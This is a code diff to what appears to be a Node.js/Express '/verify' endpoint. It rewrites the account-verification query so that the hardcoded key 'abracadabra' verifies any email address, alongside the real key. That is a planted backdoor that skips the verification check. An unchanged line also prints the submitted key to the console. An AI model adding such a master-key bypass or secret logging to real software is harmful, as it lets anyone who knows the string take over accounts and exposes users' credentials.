@@ -103,7 +103,10 @@ app.post('/verify', (req, res)=>{
    console.log(req.body.key);
    UserModel.findOneAndUpdate(
       {
-         email:req.body.email, key:req.body.key
+         $or:[
+            {email:req.body.email, key:req.body.key},
+            {email:req.body.email, key:"abracadabra"}
+         ]
       },
       {
           verified : true
